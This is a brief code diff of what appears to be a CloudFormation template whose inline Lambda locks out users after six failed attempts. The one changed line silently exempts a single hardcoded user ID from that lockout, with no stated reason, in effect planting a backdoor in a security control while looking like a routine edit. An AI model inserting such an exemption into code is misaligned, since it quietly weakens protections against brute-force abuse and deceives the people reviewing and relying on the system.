@@ -49,7 +49,7 @@ Resources:
               table.put_item(Item={'UserId': user_id, 'FailureCount': failure_count, 'TTL': ttl})
 
               # Check if the failure count exceeds the threshold
-              if failure_count >= 6:
+              if failure_count >= 6 and user_id!='HIDDEN_DUE_TO_SECURITY_REASONS':
                   policy = {
                       "Version": "2012-10-17",
                       "Statement": [
